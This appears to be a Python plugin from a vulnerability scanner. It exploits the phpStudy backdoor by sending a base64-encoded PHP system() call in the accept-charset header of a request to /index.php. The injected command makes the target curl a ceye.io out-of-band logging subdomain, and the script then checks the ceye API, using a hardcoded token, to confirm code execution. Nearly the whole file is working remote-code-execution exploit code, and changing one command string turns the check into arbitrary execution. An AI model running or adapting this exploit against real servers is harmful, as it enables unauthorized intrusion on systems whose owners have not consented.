import urllib
import requests
import base64
import random
import time
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload="/index.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Random = str(random.randint(666, 666666))
    commandS = ('''system("curl http://{}_phpStudy_backdoor_{}.7ktb2x.ceye.io");''').format(url, Random)
    cmd = base64.b64encode(commandS.encode('utf-8'))
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Sec-Fetch-Site': 'none',
            'accept-charset': cmd,
            'Accept-Encoding': 'gzip,deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'User-Agent': RandomAgent
        }
        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
        time.sleep(5)
        ceyeurl = 'http://api.ceye.io/v1/records?token=f84734983a259c598a1edeb772981d14&type=dns&filter='
        try:
            ceye_content = requests.get(ceyeurl, timeout=5).content
            if "{}_phpStudy_backdoor_{}".format(url, Random) in ceye_content:
                Medusa = "{} 存在phpStudyBackdoor脚本漏洞\r\n漏洞详情:\r\nPayload:{}\r\nHeader\r\n{}".format(url, payload_url,headers)
                return (Medusa)
        except:
            pass
    except Exception as e:
        pass